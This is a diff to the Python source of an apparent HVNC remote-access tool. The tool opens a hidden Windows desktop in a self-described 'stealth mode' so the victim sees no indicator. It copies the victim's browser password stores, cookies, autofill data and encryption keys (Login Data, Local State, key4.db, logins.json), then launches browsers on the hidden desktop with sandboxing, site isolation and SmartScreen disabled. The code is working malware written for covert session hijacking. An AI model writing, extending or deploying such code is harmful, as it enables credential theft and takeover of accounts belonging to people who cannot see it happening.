@@ -53,7 +53,21 @@ if platform.system() == "Windows":
     GMEM_MOVEABLE = 0x0002
 
 # Browser profile paths and launch configurations
-# Extended args for stability: disable GPU issues, sync, background networking
+# Extended args for HVNC isolation - prevents connecting to existing browser process
+# Critical flags:
+# - --user-data-dir: Forces separate profile (prevents sharing with main desktop browser)
+# - --no-sandbox: Required for hidden desktop process creation
+# - --disable-gpu: Avoids GPU context issues on hidden desktop
+# - --disable-background-mode: Prevents background processes on main desktop
+# - --disable-features=RendererCodeIntegrity: Required for Win11 24H2
+# - --new-window: Forces new window instead of tab in existing browser
+# Critical flags for HVNC browser isolation on Windows 11 24H2:
+# - --disable-gpu-sandbox: Prevents GPU process from spawning on different desktop
+# - --in-process-gpu: Run GPU in main process to inherit desktop
+# - --single-process: (EXPERIMENTAL) All renderers in one process
+# - --disable-features=RendererCodeIntegrity: Required for Win11 24H2
+# - --disable-site-isolation-trials: Reduces process spawning
+
 BROWSER_PROFILES = {
     "chrome": {
         "paths": [
@@ -71,8 +85,26 @@ BROWSER_PROFILES = {
             "--disable-background-networking",
             "--disable-client-side-phishing-detection",
             "--disable-component-update",
-            "--no-sandbox",  # Required for hidden desktop
-            "--disable-gpu",  # Avoid GPU issues on hidden desktop
+            "--no-sandbox",
+            "--disable-gpu",
+            "--disable-gpu-sandbox",  # Critical: GPU process inherits desktop
+            "--in-process-gpu",  # GPU runs in main process
+            "--disable-software-rasterizer",
+            "--disable-background-mode",
+            "--disable-backgrounding-occluded-windows",
+            "--disable-renderer-backgrounding",
+            "--disable-features=RendererCodeIntegrity,BackgroundFetch,TranslateUI,IsolateOrigins,site-per-process",
+            "--disable-site-isolation-trials",  # Reduces process spawning
+            "--disable-hang-monitor",
+            "--disable-ipc-flooding-protection",
+            "--disable-popup-blocking",
+            "--disable-prompt-on-repost",
+            "--disable-domain-reliability",
+            "--renderer-process-limit=1",  # Limit renderer processes
+            "--new-window",
+            "--start-maximized",
+            "--window-position=0,0",
+            "--force-device-scale-factor=1",
         ],
     },
     "firefox": {
@@ -83,7 +115,13 @@ BROWSER_PROFILES = {
             r"C:\Program Files\Mozilla Firefox\firefox.exe",
             r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
         ],
-        "args": ["-profile", "{profile_dir}", "-no-remote"],
+        "args": [
+            "-profile", "{profile_dir}",
+            "-no-remote",  # Critical: don't connect to existing Firefox
+            "-new-instance",  # Force new instance
+            "-width", "1920",
+            "-height", "1080",
+        ],
     },
     "edge": {
         "paths": [
@@ -103,7 +141,27 @@ BROWSER_PROFILES = {
             "--disable-component-update",
             "--no-sandbox",
             "--disable-gpu",
-            "--disable-features=msSmartScreenProtection",  # Disable SmartScreen
+            "--disable-gpu-sandbox",  # Critical: GPU process inherits desktop
+            "--in-process-gpu",  # GPU runs in main process
+            "--disable-software-rasterizer",
+            "--disable-background-mode",
+            "--disable-backgrounding-occluded-windows",
+            "--disable-renderer-backgrounding",
+            "--disable-features=msSmartScreenProtection,RendererCodeIntegrity,BackgroundFetch,EdgeCollections,msEdgeCollections,IsolateOrigins,site-per-process",
+            "--disable-site-isolation-trials",  # Reduces process spawning
+            "--disable-hang-monitor",
+            "--disable-ipc-flooding-protection",
+            "--disable-popup-blocking",
+            "--disable-prompt-on-repost",
+            "--disable-domain-reliability",
+            "--renderer-process-limit=1",  # Limit renderer processes
+            "--inprivate",  # InPrivate mode - extra isolation
+            "--new-window",
+            "--start-maximized",
+            "--window-position=0,0",
+            "--force-device-scale-factor=1",
+            "--disable-edge-collections",
+            "--disable-reading-list",
         ],
     },
     "opera": {
@@ -122,6 +180,15 @@ BROWSER_PROFILES = {
             "--disable-background-networking",
             "--no-sandbox",
             "--disable-gpu",
+            "--disable-gpu-sandbox",
+            "--in-process-gpu",
+            "--disable-software-rasterizer",
+            "--disable-background-mode",
+            "--disable-features=RendererCodeIntegrity,IsolateOrigins,site-per-process",
+            "--disable-site-isolation-trials",
+            "--renderer-process-limit=1",
+            "--new-window",
+            "--start-maximized",
         ],
     },
     "brave": {
@@ -140,6 +207,15 @@ BROWSER_PROFILES = {
             "--disable-background-networking",
             "--no-sandbox",
             "--disable-gpu",
+            "--disable-gpu-sandbox",
+            "--in-process-gpu",
+            "--disable-software-rasterizer",
+            "--disable-background-mode",
+            "--disable-features=RendererCodeIntegrity,IsolateOrigins,site-per-process",
+            "--disable-site-isolation-trials",
+            "--renderer-process-limit=1",
+            "--new-window",
+            "--start-maximized",
         ],
     },
 }
@@ -175,31 +251,48 @@ class HVNCActions:
         return self._active and self._session is not None
     
     def start(self) -> dict:
-        """Start HVNC session - create hidden desktop."""
-        if self._active:
+        """Start HVNC session - create hidden desktop.
+        
+        Note: If DualStreamSession is used, the session is already created
+        and set via set_session(). In that case, we just start the shell
+        on the existing session instead of creating a new one.
+        """
+        if self._active and self._session is not None:
+            # Session already exists (likely from DualStreamSession)
+            # Just ensure shell is running if needed
+            desktop_name = self._desktop_name
+            if not desktop_name and hasattr(self._session, 'desktop'):
+                desktop = getattr(self._session, 'desktop', None)
+                if desktop and hasattr(desktop, 'name'):
+                    desktop_name = desktop.name
+            
+            logger.info("HVNC already active via existing session: %s", desktop_name)
+            return {
+                "action": "hvnc_start",
+                "success": True,
+                "desktop_name": desktop_name,
+                "message": "HVNC already active (via DualStreamSession)"
+            }
+        
+        try:
+            from .hvnc import create_hvnc_session
+            # Create session WITHOUT shell for stealth mode
+            # Shell (explorer.exe) would be visible indicator to user
+            self._session = create_hvnc_session(
+                width=1920,
+                height=1080,
+                fps=30,
+                start_shell=False,  # STEALTH MODE - no explorer
+            )
+            self._active = True
+            self._desktop_name = self._session.desktop.name
+            
+            logger.info("HVNC started (stealth mode, no shell): %s", self._desktop_name)
             return {
                 "action": "hvnc_start",
                 "success": True,
                 "desktop_name": self._desktop_name,
-                "message": "HVNC already active"
-            }
-        
-        try:
-            from .hvnc import HVNCSession
-            self._session = HVNCSession(
-                width=1920,
-                height=1080,
-                fps=30,
-            )
-            self._session.start_shell()
-            self._active = True
-            self._desktop_name = self._session.desktop.name
-            
-            logger.info("HVNC started: %s", self._desktop_name)
-            return {
-                "action": "hvnc_start",
-                "success": True,
-                "desktop_name": self._desktop_name
+                "stealth": True
             }
         except Exception as exc:
             logger.error("Failed to start HVNC: %s", exc)
@@ -265,12 +358,272 @@ class HVNCActions:
             "process_count": len(self._processes)
         }
     
-    def launch_browser(self, browser: str, clone_profile: bool = True) -> dict:
+    def start_shell(self) -> dict:
+        """Start explorer.exe shell on HVNC desktop.
+        
+        By default HVNC runs in stealth mode without shell.
+        Call this to explicitly start explorer (taskbar, start menu, etc.)
+        """
+        if not self.is_active:
+            return {
+                "action": "hvnc_start_shell",
+                "success": False,
+                "error": "HVNC not active"
+            }
+        
+        try:
+            result = self._session.start_shell()
+            if result:
+                logger.info("Started shell on HVNC desktop")
+                return {
+                    "action": "hvnc_start_shell",
+                    "success": True,
+                    "message": "Shell started"
+                }
+            else:
+                return {
+                    "action": "hvnc_start_shell",
+                    "success": False,
+                    "error": "Shell start failed"
+                }
+        except Exception as exc:
+            logger.error("Failed to start shell: %s", exc)
+            return {
+                "action": "hvnc_start_shell",
+                "success": False,
+                "error": str(exc)
+            }
+    
+    def _clone_profile_chromium(self, original_profile: str, temp_dir: str) -> None:
+        """Clone Chromium-based browser profile (Chrome, Edge, Brave, Opera).
+        
+        Copies only essential files for fast, non-blocking operation.
+        """
+        src_default = os.path.join(original_profile, "Default")
+        if os.path.exists(src_default):
+            dst_default = os.path.join(temp_dir, "Default")
+            os.makedirs(dst_default, exist_ok=True)
+            
+            # Essential files for passwords, cookies, sessions
+            essential_files = [
+                "Login Data",           # Saved passwords
+                "Login Data-journal",   # Password journal
+                "Cookies",              # Session cookies
+                "Cookies-journal",      # Cookie journal
+                "Web Data",             # Autofill data
+                "Web Data-journal",     # Autofill journal
+                "Preferences",          # Browser preferences
+                "Secure Preferences",   # Secure prefs
+                "Bookmarks",            # Bookmarks
+                "History",              # Browser history
+                "Favicons",             # Site favicons
+            ]
+            
+            # Copy essential files
+            for fname in essential_files:
+                src_file = os.path.join(src_default, fname)
+                if os.path.exists(src_file):
+                    try:
+                        shutil.copy2(src_file, os.path.join(dst_default, fname))
+                        logger.debug("Copied %s", fname)
+                    except Exception as e:
+                        logger.debug("Could not copy %s: %s", fname, e)
+            
+            # Copy Local Storage directory (site data)
+            local_storage_src = os.path.join(src_default, "Local Storage")
+            if os.path.exists(local_storage_src):
+                try:
+                    shutil.copytree(
+                        local_storage_src,
+                        os.path.join(dst_default, "Local Storage"),
+                        ignore=shutil.ignore_patterns("*.log")
+                    )
+                    logger.debug("Copied Local Storage")
+                except Exception as e:
+                    logger.debug("Could not copy Local Storage: %s", e)
+            
+            # Copy IndexedDB directory (site databases)
+            indexeddb_src = os.path.join(src_default, "IndexedDB")
+            if os.path.exists(indexeddb_src):
+                try:
+                    shutil.copytree(
+                        indexeddb_src,
+                        os.path.join(dst_default, "IndexedDB"),
+                        ignore=shutil.ignore_patterns("*.log")
+                    )
+                    logger.debug("Copied IndexedDB")
+                except Exception as e:
+                    logger.debug("Could not copy IndexedDB: %s", e)
+            
+            # Copy Session Storage (for tabs)
+            session_storage_src = os.path.join(src_default, "Session Storage")
+            if os.path.exists(session_storage_src):
+                try:
+                    shutil.copytree(
+                        session_storage_src,
+                        os.path.join(dst_default, "Session Storage"),
+                        ignore=shutil.ignore_patterns("*.log")
+                    )
+                    logger.debug("Copied Session Storage")
+                except Exception as e:
+                    logger.debug("Could not copy Session Storage: %s", e)
+            
+            # Copy Extensions directory
+            extensions_src = os.path.join(src_default, "Extensions")
+            if os.path.exists(extensions_src):
+                try:
+                    shutil.copytree(
+                        extensions_src,
+                        os.path.join(dst_default, "Extensions"),
+                    )
+                    logger.debug("Copied Extensions")
+                except Exception as e:
+                    logger.debug("Could not copy Extensions: %s", e)
+        
+        # Copy Local State (encryption keys - CRITICAL for passwords)
+        local_state = os.path.join(original_profile, "Local State")
+        if os.path.exists(local_state):
+            shutil.copy2(local_state, temp_dir)
+            logger.debug("Copied Local State (encryption keys)")
+    
+    def _clone_profile_firefox(self, original_profile: str, temp_dir: str) -> None:
+        """Clone Firefox profile."""
+        firefox_essential_files = [
+            "logins.json",          # Saved passwords
+            "key4.db",              # Password encryption key
+            "cert9.db",             # Certificates
+            "cookies.sqlite",       # Cookies
+            "places.sqlite",        # Bookmarks and history
+            "prefs.js",             # Preferences
+            "formhistory.sqlite",   # Form autofill
+            "permissions.sqlite",   # Site permissions
+            "content-prefs.sqlite", # Content preferences
+            "webappsstore.sqlite",  # Local storage
+        ]
+        
+        for item in firefox_essential_files:
+            src = os.path.join(original_profile, item)
+            if os.path.exists(src):
+                try:
+                    shutil.copy2(src, os.path.join(temp_dir, item))
+                    logger.debug("Copied %s", item)
+                except Exception as e:
+                    logger.debug("Could not copy %s: %s", item, e)
+        
+        # Copy storage directory
+        storage_src = os.path.join(original_profile, "storage")
+        if os.path.exists(storage_src):
+            try:
+                shutil.copytree(
+                    storage_src,
+                    os.path.join(temp_dir, "storage"),
+                    ignore=shutil.ignore_patterns("*.log", "cache*")
+                )
+            except Exception as e:
+                logger.debug("Could not copy storage: %s", e)
+    
+    def _launch_browser_background(
+        self,
+        browser: str,
+        exe_path: str,
+        config: dict,
+        clone_profile: bool,
+        callback: Callable[[dict], None] | None = None,
+    ) -> None:
+        """Launch browser in background thread with profile cloning.
+        
+        This runs profile cloning and browser launch in a separate thread
+        to avoid blocking the main thread and causing WebRTC ICE timeout.
+        
+        Args:
+            browser: Browser name
+            exe_path: Path to browser executable
+            config: Browser config from BROWSER_PROFILES
+            clone_profile: Whether to clone profile
+            callback: Optional callback with result dict
+        """
+        result = {"action": "hvnc_launch_browser", "success": False}
+        browser_lower = browser.lower()
+        
+        try:
+            profile_dir = None
+            if clone_profile:
+                # Find original profile
+                original_profile = None
+                for path in config["paths"]:
+                    if os.path.exists(path):
+                        original_profile = path
+                        break
+                
+                if original_profile:
+                    import tempfile
+                    temp_dir = tempfile.mkdtemp(prefix=f"hvnc_{browser_lower}_")
+                    profile_dir = temp_dir
+                    
+                    logger.info("Cloning %s profile to %s (background thread)", browser, temp_dir)
+                    
+                    # Clone based on browser type
+                    if browser_lower in ("chrome", "edge", "brave", "opera"):
+                        self._clone_profile_chromium(original_profile, temp_dir)
+                    else:
+                        self._clone_profile_firefox(original_profile, temp_dir)
+                    
+                    with self._lock:
+                        self._temp_profiles.append(temp_dir)
+                    logger.info("Profile cloned to %s", temp_dir)
+            
+            # Build command args
+            args = []
+            for arg in config["args"]:
+                if profile_dir:
+                    args.append(arg.format(profile_dir=profile_dir))
+                elif "{profile_dir}" not in arg:
+                    args.append(arg)
+            
+            # Launch on hidden desktop
+            logger.info("Launching %s on hidden desktop", browser)
+            proc = self._session.launch_application(exe_path, args=args)
+            
+            if proc:
+                with self._lock:
+                    self._processes.append(proc)
+                result = {
+                    "action": "hvnc_launch_browser",
+                    "success": True,
+                    "app": browser,
+                    "pid": proc.pid,
+                    "cloned": clone_profile and profile_dir is not None
+                }
+                logger.info("Browser %s launched with PID %s", browser, proc.pid)
+            else:
+                result = {
+                    "action": "hvnc_launch_browser",
+                    "success": False,
+                    "error": "Failed to launch process"
+                }
+                
+        except Exception as exc:
+            logger.error("Failed to launch browser %s: %s", browser, exc)
+            result = {
+                "action": "hvnc_launch_browser",
+                "success": False,
+                "error": str(exc)
+            }
+        
+        if callback:
+            try:
+                callback(result)
+            except Exception as e:
+                logger.warning("Callback failed: %s", e)
+    
+    def launch_browser(self, browser: str, clone_profile: bool = True, async_launch: bool = True) -> dict:
         """Launch browser on hidden desktop with optional profile cloning.
         
         Args:
             browser: Browser name (chrome, firefox, edge, opera, brave)
             clone_profile: Whether to clone the user's browser profile
+            async_launch: If True, clone profile and launch in background thread
+                         (non-blocking, prevents WebRTC ICE timeout)
             
         Profile cloning copies ONLY essential files for fast, non-blocking operation:
         - Login Data: saved passwords
@@ -281,6 +634,9 @@ class HVNCActions:
         - IndexedDB: site databases
         
         Large files like cache are EXCLUDED to keep cloning fast.
+        
+        Note: When async_launch=True, this returns immediately with status "launching"
+        and the actual browser launch happens in background thread.
         """
         if not self.is_active:
             return {
@@ -313,10 +669,28 @@ class HVNCActions:
                 "error": f"{browser} not installed"
             }
         
+        if async_launch:
+            # Launch in background thread to avoid blocking WebRTC
+            thread = threading.Thread(
+                target=self._launch_browser_background,
+                args=(browser, exe_path, config, clone_profile),
+                daemon=True,
+            )
+            thread.start()
+            
+            logger.info("Browser %s launch initiated (async)", browser)
+            return {
+                "action": "hvnc_launch_browser",
+                "success": True,
+                "status": "launching",
+                "app": browser,
+                "message": "Browser launch started in background"
+            }
+        
+        # Synchronous launch (for backwards compatibility)
         try:
             profile_dir = None
             if clone_profile:
-                # Find original profile
                 original_profile = None
                 for path in config["paths"]:
                     if os.path.exists(path):
@@ -324,141 +698,19 @@ class HVNCActions:
                         break
                 
                 if original_profile:
-                    # Create temp copy of profile
                     import tempfile
                     temp_dir = tempfile.mkdtemp(prefix=f"hvnc_{browser_lower}_")
                     profile_dir = temp_dir
                     
-                    # Copy profile incrementally (fast, non-blocking)
-                    logger.info("Cloning %s profile to %s (incremental)", browser, temp_dir)
+                    logger.info("Cloning %s profile to %s", browser, temp_dir)
                     
-                    # For Chrome-based browsers, copy ONLY essential files
                     if browser_lower in ("chrome", "edge", "brave", "opera"):
-                        src_default = os.path.join(original_profile, "Default")
-                        if os.path.exists(src_default):
-                            dst_default = os.path.join(temp_dir, "Default")
-                            os.makedirs(dst_default, exist_ok=True)
-                            
-                            # Essential files for passwords, cookies, sessions
-                            essential_files = [
-                                "Login Data",           # Saved passwords
-                                "Login Data-journal",   # Password journal
-                                "Cookies",              # Session cookies
-                                "Cookies-journal",      # Cookie journal
-                                "Web Data",             # Autofill data
-                                "Web Data-journal",     # Autofill journal
-                                "Preferences",          # Browser preferences
-                                "Secure Preferences",   # Secure prefs
-                                "Bookmarks",            # Bookmarks
-                                "History",              # Browser history
-                                "Favicons",             # Site favicons
-                            ]
-                            
-                            # Copy essential files
-                            for fname in essential_files:
-                                src_file = os.path.join(src_default, fname)
-                                if os.path.exists(src_file):
-                                    try:
-                                        shutil.copy2(src_file, os.path.join(dst_default, fname))
-                                        logger.debug("Copied %s", fname)
-                                    except Exception as e:
-                                        logger.debug("Could not copy %s: %s", fname, e)
-                            
-                            # Copy Local Storage directory (site data)
-                            local_storage_src = os.path.join(src_default, "Local Storage")
-                            if os.path.exists(local_storage_src):
-                                try:
-                                    shutil.copytree(
-                                        local_storage_src,
-                                        os.path.join(dst_default, "Local Storage"),
-                                        ignore=shutil.ignore_patterns("*.log")
-                                    )
-                                    logger.debug("Copied Local Storage")
-                                except Exception as e:
-                                    logger.debug("Could not copy Local Storage: %s", e)
-                            
-                            # Copy IndexedDB directory (site databases)
-                            indexeddb_src = os.path.join(src_default, "IndexedDB")
-                            if os.path.exists(indexeddb_src):
-                                try:
-                                    shutil.copytree(
-                                        indexeddb_src,
-                                        os.path.join(dst_default, "IndexedDB"),
-                                        ignore=shutil.ignore_patterns("*.log")
-                                    )
-                                    logger.debug("Copied IndexedDB")
-                                except Exception as e:
-                                    logger.debug("Could not copy IndexedDB: %s", e)
-                            
-                            # Copy Session Storage (for tabs)
-                            session_storage_src = os.path.join(src_default, "Session Storage")
-                            if os.path.exists(session_storage_src):
-                                try:
-                                    shutil.copytree(
-                                        session_storage_src,
-                                        os.path.join(dst_default, "Session Storage"),
-                                        ignore=shutil.ignore_patterns("*.log")
-                                    )
-                                    logger.debug("Copied Session Storage")
-                                except Exception as e:
-                                    logger.debug("Could not copy Session Storage: %s", e)
-                            
-                            # Copy Extensions directory
-                            extensions_src = os.path.join(src_default, "Extensions")
-                            if os.path.exists(extensions_src):
-                                try:
-                                    shutil.copytree(
-                                        extensions_src,
-                                        os.path.join(dst_default, "Extensions"),
-                                    )
-                                    logger.debug("Copied Extensions")
-                                except Exception as e:
-                                    logger.debug("Could not copy Extensions: %s", e)
-                        
-                        # Copy Local State (encryption keys - CRITICAL for passwords)
-                        local_state = os.path.join(original_profile, "Local State")
-                        if os.path.exists(local_state):
-                            shutil.copy2(local_state, temp_dir)
-                            logger.debug("Copied Local State (encryption keys)")
-                    
+                        self._clone_profile_chromium(original_profile, temp_dir)
                     else:
-                        # Firefox - copy essential profile files
-                        firefox_essential_files = [
-                            "logins.json",          # Saved passwords
-                            "key4.db",              # Password encryption key
-                            "cert9.db",             # Certificates
-                            "cookies.sqlite",       # Cookies
-                            "places.sqlite",        # Bookmarks and history
-                            "prefs.js",             # Preferences
-                            "formhistory.sqlite",   # Form autofill
-                            "permissions.sqlite",   # Site permissions
-                            "content-prefs.sqlite", # Content preferences
-                            "webappsstore.sqlite",  # Local storage
-                        ]
-                        
-                        for item in firefox_essential_files:
-                            src = os.path.join(original_profile, item)
-                            if os.path.exists(src):
-                                try:
-                                    shutil.copy2(src, os.path.join(temp_dir, item))
-                                    logger.debug("Copied %s", item)
-                                except Exception as e:
-                                    logger.debug("Could not copy %s: %s", item, e)
-                        
-                        # Copy storage directory
-                        storage_src = os.path.join(original_profile, "storage")
-                        if os.path.exists(storage_src):
-                            try:
-                                shutil.copytree(
-                                    storage_src,
-                                    os.path.join(temp_dir, "storage"),
-                                    ignore=shutil.ignore_patterns("*.log", "cache*")
-                                )
-                            except Exception as e:
-                                logger.debug("Could not copy storage: %s", e)
+                        self._clone_profile_firefox(original_profile, temp_dir)
                     
                     self._temp_profiles.append(temp_dir)
-                    logger.info("Profile cloned incrementally to %s", temp_dir)
+                    logger.info("Profile cloned to %s", temp_dir)
             
             # Build command
             args = []
@@ -889,6 +1141,7 @@ class HVNCActions:
             "start": lambda: self.start(),
             "stop": lambda: self.stop(),
             "status": lambda: self.get_status(),
+            "start_shell": lambda: self.start_shell(),  # Optional shell start
             "launch_browser": lambda: self.launch_browser(
                 payload.get("browser", "chrome"),
                 payload.get("clone_profile", True)
